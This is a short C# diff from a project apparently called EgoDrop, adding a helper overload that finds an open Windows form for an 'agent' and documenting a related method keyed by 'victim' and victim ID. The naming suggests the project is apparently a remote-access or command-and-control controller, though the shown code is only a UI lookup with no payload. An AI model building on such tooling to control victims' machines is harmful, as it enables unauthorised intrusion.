@@ -35,6 +35,24 @@ namespace EgoDrop
             return v1.m_sktClnt == v2.m_sktClnt;
         }
 
+        /// <summary>
+        /// Find opened window form with agent.
+        /// </summary>
+        /// <typeparam name="T">Form class.</typeparam>
+        /// <param name="agent">Agent object.</param>
+        /// <returns></returns>
+        public static T fnFindForm<T>(clsAgent agent) where T : Form
+        {
+            return fnFindForm<T>(agent.m_victim, agent.m_szVictimID);
+        }
+
+        /// <summary>
+        /// Find opened window form with victim and ID.
+        /// </summary>
+        /// <typeparam name="T">Form class.</typeparam>
+        /// <param name="victim">Victim object.</param>
+        /// <param name="szVictimID">Victim's ID.</param>
+        /// <returns></returns>
         public static T fnFindForm<T>(clsVictim victim, string szVictimID) where T : Form
         {
             foreach (Form f in Application.OpenForms)
